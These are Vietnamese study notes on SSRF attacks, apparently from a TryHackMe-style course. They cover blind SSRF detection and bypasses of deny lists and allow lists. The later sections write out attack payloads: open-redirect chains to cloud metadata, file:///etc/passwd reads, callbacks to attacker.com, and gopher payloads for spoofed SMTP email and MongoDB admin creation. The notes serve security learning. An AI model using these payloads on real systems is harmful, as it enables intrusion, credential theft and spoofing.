

# I/What is an SSRF

-Tấn công SSRF là kiểu tấn công mà attacker kiểm soát khiến cho các request của server đi về mục tiêu mà attacker mong muốn.

-Cùng với đó lợi dụng việc kiểm soát được server attacker cũng sẽ kiểm soát được các ip dịch vụ trong cùng 1 ip nội bộ, bởi vì đa phần các dịch vụ trong cùng 1 ip nội bộ đều tin tưởng lẫn nhau

-Có 2 kiểu SSRF:

|   |   |   |
|---|---|---|
|Type|Response Visible|Description|
|Regular SSRF|Yes|Có thể xem được trực tiếp response phản hồi từ phía máy chủ(BE) thông qua client(FE)|
|Blind SSRF|No|Attacker không thể xem được phản hồi của phía BE thông qua FE, mà phải sử dụng 1 method khác để xác nhận expoit thành công hay không|

+Lý do sinh ra Blind SSRF:

- Do dev đã fix cố định vào server với mục tiêu là FE đã được nhận biết sẵn là luôn trả lại 200 dù kết quả có là gì

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF.png>)

- Nhưng attacker vẫn có thể confirm bằng cách chuyển hướng của server application về hướng của server attacker điều khiển(chúng ta có thể sử dụng công cụ Burp Collaborator hỗ trợ) và quan sát callback được trả về, quan sát được Response Time & Error Messages để suy luận ra Internal Infrastructure
- Lý do suy luận ra Internal Infrastructure:

*Khi server gửi đến request đến 1 host sẽ có 3 trường hợp sau:

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%201.png>)

*Cùng với error message chúng ta cũng suy ra được

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%202.png>)

=>Nhờ đó mà suy ra được host có tồn tại hay không, có các service dịch vụ nào đang chạy và port nào đang mở

-Impact:

+Impact được xác định thông qua việc server application cps thể truy cập đến các service nội bộ nào

|   |   |
|---|---|
|Impact|Description|
|Access to Internal Endpoint|Admin panels, configuration interfaces, và monitoring dashboards dù không đi ra internet nhưng vẫn bị truy cập được do request đến từ server application nội|
|Sensitive data exposure|Backend databases, private APIs, và internal tooling có thể trả lại customer data, organisational records, hoặc application secrets bởi chính yêu cầu của server application|
|Internal network reconnaissance|Bằng cách gửi yêu cầu đến các địa chỉ IP và cổng khác nhau, kẻ tấn công có thể lập bản đồ các máy chủ và dịch vụ nội bộ bằng cách sử dụng sự khác biệt về thời gian phản hồi, mã trạng thái và thông báo lỗi.|
|Cloud metadata theft|Các nhà cung cấp dịch vụ đám mây như AWS, GCP và Azure công khai siêu dữ liệu của phiên bản tại địa chỉ 169.254.169.254. Kẻ tấn công truy cập được vào điểm cuối này có thể lấy được thông tin đăng nhập tạm thời, chi tiết vai trò IAM và dữ liệu cấu hình phiên bản.|
|Credential and token leakage|Các mã xác thực và thông tin bí mật được truyền giữa các dịch vụ nội bộ có thể bị chặn, đặc biệt là khi giao tiếp phía máy chủ chạy trên giao thức HTTP không được mã hóa.|

# II/SSRF Pattern

-Trong thực tế tấn công SSRF không phải lúc nào cũng là 1 url đầy đủ trong tham số truy vấn mà nó còn phụ thuộc và cách mà người dùng gửi dữ liệu đến server

-Ở đây chúng ta sẽ xem xét 4 mẫu phổ biến

## 1/Full Url in a Parameter

-Đây là hình thức phổ biến nhất bằng cách nhận url trực tiếp từ client và sử dụng url đó trong máy chủ

-Cách hoạt động:

+Khi client gửi [https://website.thm/item/2?server=api](https://website.thm/item/2?server=api) thì client chỉ muốn xem item 2 và server được gọi api

+Thì lúc này bên phía BE sẽ build call server url như sau [https://api.website.thm/api/item?id=2](https://api.website.thm/api/item?id=2) nhờ vậy mà client sẽ không được biết url nội bộ là gì và để tạo được template này bên phía BE sẽ có code như sau

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%203.png>)

+Flow hoàn chỉnh

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%204.png>)

+Và cũng chính template này gây ra SSRF như sau:

- Attacker sẽ chèn [https://website.thm/item/2?server=api](https://website.thm/item/2?server=api) và thay bằng https://website.thm/item/2?server= server.website.thm/flag?id=9&x= (Trick là những gì phía sau &x= sẽ bị loại bỏ)

-Key Takeaway:

+Điểm mấu chốt của phương pháp này là phải nhìn ra được template của server thì mới có thể áp dụng tấn công được

## 2/Partial URL (Hostname or Path Only)

-Một số ứng dụng chỉ chấp nhận mỗi tên máy chủ hoặc path only và xây dựng phần còn lại bên phía client

-Ví dụ client sẽ gửi 1 URL như sau: https://website.thm/stock?server=api.internal

-Attacker chỉ cần thay đổi thành ?server= attacker.com thì server application sẽ request đến server attacker và nó cũng giúp chúng ta xác nhận trong SSRF blind rằng SSRF có thành công hay không

-Về cơ chế nó tấn công nó sẽ giống như bên Full URL in Parameter chỉ khác ở việc ta sẽ không đọc được nó ở client mà cần thông qua 1 bên thứ 3(ví dụ như Burp Collabration)

-Lý do gây ra SSRF trong cơ chế này thường là do dev không validate against allowlist server

-Về Path Only:

+Cấu trúc khi BE xây dựng 1 URL request![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%205.png>)

+Khi app chỉ nhận path

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%206.png>)

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%207.png>)

- Lúc này chúng ta sẽ sử dụng Path traversal để tấn công khi only path

-So sánh giữa hostname và Path-only

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%208.png>)

## 3/Path Traversal in The URL

-Lợi dụng cách tấn công path traversal chúng ta dùng nó để leo thang vào những endpoint mà chúng ta không được phép truy cập

-Lý do khiến cho có kiểu tấn công này thường do dev không validation các path traversal

-Cách tấn công

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%209.png>)

-Sự khác nhau của path traversal trong SSRF và LFI(Local File Inclusion)

+Giải thích [https://website.thm/item/../admin](https://website.thm/item/../admin)

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2010.png>)

+So sánh

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2011.png>)

=>Cả 2 đều giống nhau là đều dùng kỹ thuật path travel để leo ra ngoài nhưng path traversal sẽ để đọc file trên ổ cứng, còn SSRF path traversal là dùng để để endpoint bị cấm vào

## 4/Hidden Form Fields

-SSRF không chỉ tồn tại trong url của application và còn ẩn trong content của hệ thống như trong HTML source đặc biệt là các mục hidden

-Thường được tìm ra thông qua việc inspect thủ công và chặn request

-Lý do xảy ra thường do dev không xử lý tốt các mục hidden trên application

-Cách tấn công:

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2012.png>)

# III/Finding an SSRF

-Việc xác định được SSRF có tồn tại thì chúng ta phải biết được đầu vào tấn công ở đâu và nó sẽ ảnh hưởng đến phía máy chủ như thế nào

-Dựa vào 2 kiểu SSRF chúng ta có 2 cách xác định sau

## 1/Các vector phổ biến

### a/Các mẫu SSRF Patern phổ biến

**-Full URL in a parameter.** When a complete URL appears as a query parameter in the address bar, the application is almost certainly using it to make a server-side request:

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2013.png>)

**-Hidden form fields.** These are not visible on the rendered page. Inspecting the page source or intercepting requests with a proxy reveals fields whose values control server-side resource fetching:

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2014.png>)

**-Partial URL (hostname only).** The application accepts a hostname and constructs the full URL on the server side:

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2015.png>)

**-Path only.** Only the path portion of the URL is user-controlled. The application prepends the scheme and hostname:

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2016.png>)

### b/Các vector dịch vụ gây ra SSRF

-Webhook configuration

+Webhook là gì?

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2017.png>)

- Ví dụ:
- Shop Online dùng stripe thanh toán

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2018.png>)

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2019.png>)

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2020.png>)

+Cách tấn công SSRF trên webhook

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2021.png>)

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2022.png>)

-PDF/Report Generation

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2023.png>)

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2024.png>)

-URL Preview/Unfurling

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2025.png>)

+Tấn công

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2026.png>)

-File Import By URL

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2027.png>)

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2028.png>)

-Integration Settings

+Integration Settings là gì

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2029.png>)

+Cách gây ra SSRF

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2030.png>)

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2031.png>)

### c/Key takeaway

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2032.png>)

## 2/Xác nhận Blind SSRF

|   |   |
|---|---|
|Method|How it works|
|External HTTP logger (e.g. requestbin.com)|Supply the logger's URL as the SSRF payload. Check the dashboard for incoming requests from the target server.|
|Burp Collaborator|Generates a unique domain that logs HTTP and DNS callbacks. Useful when HTTP is blocked but DNS resolution still occurs.|
|Self-hosted listener (python3 -m http.server)|Run a simple HTTP server on your own machine and monitor for incoming connections from the target.|
|Timing analysis|Compare response times for requests to internal hosts that exist versus hosts that do not. Consistent differences indicate the server is resolving and connecting to the supplied address.|
|Error-based inference|Different error messages for reachable versus unreachable hosts reveal information about the internal network, even when the actual response body is hidden.|

# IV/Defeating Common SSRF Defenses

-Các dev luôn biết rõ tầm nguy hiểm của SSRF nên họ thường triển khai xác thực đầu vào để hạn chế nơi máy chủ có thể gửi yêu cầu

-Thường là 3 biện pháp phổ biến sau:

+Deny Lists

+Allow Lists

+Open Redirect Abuse

## 1/Deny List

-Các dev sẽ lập lên 1 danh sách các ip và các pattern không được đi đến. Mục tiêu là ngăn chặn truy cập vào các đích đến nhạy cảm đã biết như localhost, 127.0.0.1 và các điểm cuối siêu dữ liệu đám mây.

-Tuy nhiên nó rất dễ bị phá vỡ ví dụ như với 127.0.0.1 cũng có các kiểu biểu diễn khác nhau:

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2033.png>)

-Từ đó chúng ta cũng dễ dàng by-pass vì nó chỉ dựa vào match string

-Cũng như chúng ta cũng có thể lợi dụng DNS record để trỏ về ip đang nằm trong deny list

-Ví dụ như

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2034.png>)

-Nguyên nhân: Deny list check STRING → Không check IP thật → Inherently fragile (mong manh về bản chất)

## 2/Allow List

-Từ chối tất cả các request đến mà chỉ cho phép các request 1 mục hoặc pattern đã được chấp thuận trong allow list

-Có 2 cách by-pass phổ biến:

+Bypass 1: Subdomain Matching

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2035.png>)

+Bypass 2: URL Credential Abuse

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2036.png>)

-Nguyên nhân

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2037.png>)

## 3/Open Redirect

**-Open Redirect là gì:**

+Endpoint chuyển hướng user đến URL trong parameter:

https://website.thm/link?url=https://tryhackme.com

↑

User bị redirect đến đây

**-Bypass SSRF Protection:**

+Allow list yêu cầu: URL phải bắt đầu bằng https://website.thm/

Attacker chain 2 thứ lại:

![Lesson 7 Intro to SSRF](<Module%206%20Web%20Application%20Vulnerabilities%20I/Attachments/Lesson%207%20Intro%20to%20SSRF%2038.png>)

+Flow:

1. App check URL → Thấy website.thm → PASS ✅

2. Server request đến /link endpoint

3. /link redirect đến 169.254.169.254

4. Server follow redirect → Cloud metadata ✅

**-Tại Sao Nguy Hiểm:**

2 thứ vô hại kết hợp lại = Nguy hiểm:

Open Redirect (một mình):

└── Chỉ redirect user → Không nguy hiểm lắm

SSRF (một mình):

└── Bị block bởi allow list

SSRF + Open Redirect:

└── Bypass hoàn toàn allow list ✅

## 4/Key takeaway

**-Deny List yếu hơn Allow List** — vì không thể liệt kê hết mọi cách biểu diễn của một địa chỉ

**-Allow List mạnh hơn nhưng không đủ** — nếu chỉ dùng string matching thay vì parse URL đúng cách

-**Security phải xét tương tác giữa các feature** — Open Redirect vô hại một mình nhưng kết hợp với SSRF trở thành bypass hoàn chỉnh
# Whitelisted Domain Bypass
- Khi SSRF bị giới hạn bởi **whitelist domains/URLs**, có nhiều kỹ thuật để bypass. 
- Phần này trình bày 2 nhóm bypass chính: **Open Redirect abuse** (lợi dụng redirect của trusted domain) và **Alternative Protocol abuse** (dùng các protocol khác ngoài HTTP để reach internal services theo những cách không ngờ đến).
## 🔄 Bypass 1: Open Redirect

```
Whitelist chỉ cho phép:
https://trusted-site.com/*

Nhưng trusted-site.com có open redirect:
https://trusted-site.com/redirect?url=ANYTHING

→ Attacker chain 2 thứ:
SSRF → trusted-site.com/redirect?url=http://169.254.169.254/

Flow:
1. App check: "URL có phải trusted-site.com không?"
   → CÓ → PASS ✅
2. App gửi request đến trusted-site.com/redirect
3. trusted-site.com redirect sang 169.254.169.254
4. App FOLLOW redirect
5. Cloud metadata bị lộ! ✅
```

---

## 🌐 Bypass 2: Alternative Protocols

### `file://` — Đọc File Hệ Thống

```
file:///etc/passwd
→ Đọc trực tiếp file trên server
   Không qua network
```

### `dict://` — DICT Protocol

```
dict://<user>;<auth>@<host>:<port>/d:<word>:<db>:<n>

Dùng để:
└── Query DICT servers
    Có thể dùng để interact với services
    qua SSRF nếu app support protocol này
```

### `sftp://` — Secure File Transfer

```
url=sftp://attacker.com:11111/

→ Force server connect về sftp server của attacker
→ Blind SSRF confirmation
```

### `tftp://` — Trivial FTP (UDP)

```
ssrf.php?url=tftp://attacker.com:12346/TESTUDPPACKET

→ Gửi UDP packet (bypass TCP-only filters)
→ Useful khi TCP bị chặn
```

### `ldap://` — Directory Protocol

```
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit

→ Interact với LDAP server nội bộ
→ Có thể exfiltrate directory data
```

### `smtp://` — Email Protocol Attack Chain

```
SSRF → SMTP localhost:25

Flow thực tế:
1. Connect SSRF → smtp://localhost:25
2. Banner tiết lộ: "220 internal.corp.com ESMTP"
3. Biết được internal domain name!
4. Search GitHub cho internal domain
5. Tìm thêm subdomains → Expand attack surface
```

---

## ⚡ Gopher:// — Protocol Mạnh Nhất

```
Gopher = Gửi ARBITRARY bytes đến BẤT KỲ TCP service
         → Basically communicate với bất kỳ service nào!

Format:
gopher://<IP>:<PORT>/<DATA>
```
- "Arbitrary bytes" nghĩa đơn giản là: **bạn muốn gửi cái gì cũng được, gopher không quan tâm nội dung đó là gì.**

- Giải nghĩa từng chữ

- **Arbitrary** = tùy ý, bất kỳ, không bị ràng buộc
- **Bytes** = đơn vị dữ liệu thô nhất (chuỗi số 0/1, hoặc ký tự bất kỳ)

→ **"Arbitrary bytes"** = **"chuỗi dữ liệu bất kỳ, không cần theo khuôn mẫu nào"**
- So sánh để thấy rõ

**HTTP** thì **không** cho gửi arbitrary bytes — nó **bắt buộc** đúng cấu trúc:

```
GET /path HTTP/1.1
Host: example.com
[dòng trống]
```

Bạn phải tuân theo format này, nếu không server sẽ báo lỗi "bad request".

**Gopher** thì selector (phần sau dấu `/`) — gopher client **không kiểm tra nó là gì**, không ép nó phải là văn bản gopher hợp lệ, cứ thế gửi nguyên xi qua TCP:

```
gopher://host:port/[ĐÂY - có thể là bất kỳ chuỗi bytes nào]
```

Có thể là:

- Một câu chào bình thường: `hello`
- Lệnh Redis: `SET key value`
- Chuỗi vô nghĩa: `#$%^&*()`
- Dữ liệu nhị phân được encode

→ **Gopher không quan tâm, cứ đẩy nguyên si qua kết nối TCP.**

- **Gopher SMTP — Send Email:**

```
ssrf.php?url=gopher://127.0.0.1:25/x
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
Subject: Attack Email
You've been hacked!
.
QUIT

→ Gửi email giả mạo từ internal server!
```

- **Gopher HTTP — Craft Custom HTTP Request:**

```
# GET request
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A

# POST request với cookies
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+post+body

→ Bypass WAF bằng cách dùng Gopher
  thay vì HTTP trực tiếp
```

- **Gopher MongoDB — Tạo Admin User:**

bash

```bash
curl 'gopher://0.0.0.0:27017/_...'
# Payload tạo user:
# username=admin, password=admin123, permission=administrator

→ Interact trực tiếp với MongoDB
  (KHÔNG cần credentials!)
```
- Các trường hợp không thể sử dụng gopher
1. Ứng dụng lọc/chặn scheme

- App chỉ cho phép `http://` và `https://`, chặn hẳn `gopher://`, `file://`, `dict://`...
- Đây là biện pháp phòng thủ phổ biến nhất và đơn giản nhất → gopher **không dùng được ngay từ đầu**

2. Thư viện HTTP client không hỗ trợ gopher

- Không phải mọi ngôn ngữ/thư viện đều hỗ trợ scheme gopher
- Ví dụ: `requests` (Python) mặc định không hỗ trợ gopher; chỉ một số thư viện dựa trên `libcurl` mới hỗ trợ
- Nếu backend dùng thư viện không có gopher handler → request bị lỗi "unsupported scheme"

3. Giao thức đích là binary phức tạp

- Như MySQL đã nói — **server nói trước** với dữ liệu ngẫu nhiên (salt), cần phản hồi tính toán động
- Gopher chỉ gửi được payload **tĩnh, soạn sẵn từ trước** — không thể "đọc rồi phản hồi lại theo thời gian thực"
- → Các giao thức cần handshake qua lại nhiều bước, có tính ngẫu nhiên, đều khó/không khai thác được

4. Dịch vụ đích yêu cầu xác thực

- Redis có `requirepass`, SMTP yêu cầu SASL auth... → payload gửi vào bị từ chối trước khi tới được lệnh thật sự

5. Network segmentation / firewall nội bộ

- Dù ứng dụng cho phép gopher, nhưng nếu server chạy app đó **không có đường mạng** tới Redis/MySQL nội bộ (bị firewall/VPC chặn) → dù connect TCP cũng thất bại

6. TLS/SSL bắt buộc

- Nhiều dịch vụ hiện đại (Redis 6+, MySQL...) hỗ trợ hoặc bắt buộc kết nối mã hóa TLS
- Gopher chỉ gửi **plaintext TCP thô** — không thể tự thực hiện TLS handshake → giao tiếp thất bại

7. Giới hạn độ dài / ký tự trong URL

- Một số payload phức tạp (nhiều lệnh Redis nối tiếp) cần chuỗi bytes dài, có ký tự đặc biệt (`\r\n`, null byte...)
- Nếu framework encode/lọc URL không đúng cách, hoặc giới hạn độ dài URL → payload bị cắt/hỏng cấu trúc

8. Ứng dụng hiện đại dùng SSRF-safe library

- Nhiều framework mới (ví dụ thư viện fetch có allowlist IP, chặn private IP range như AWS metadata `169.254.169.254`...) đã tích hợp sẵn chống SSRF ở tầng network → chặn từ gốc bất kể scheme nào
---

## 🔧 Curl URL Globbing — WAF Bypass

```
Nếu SSRF dùng curl nội bộ:
└── Curl có feature "URL globbing"
    Giúp bypass WAF

Ví dụ path traversal qua file protocol:
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}

→ WAF có thể không detect pattern này
→ Nhưng curl vẫn resolve đúng path
```

---

## 🛠️ Tools Hỗ Trợ

| Tool                      | Mục Đích                                       |
| ------------------------- | ---------------------------------------------- |
| **Gopherus**              | Tự động tạo Gopher payloads cho nhiều services |
| **remote-method-guesser** | Tạo Gopher payloads cho Java RMI               |
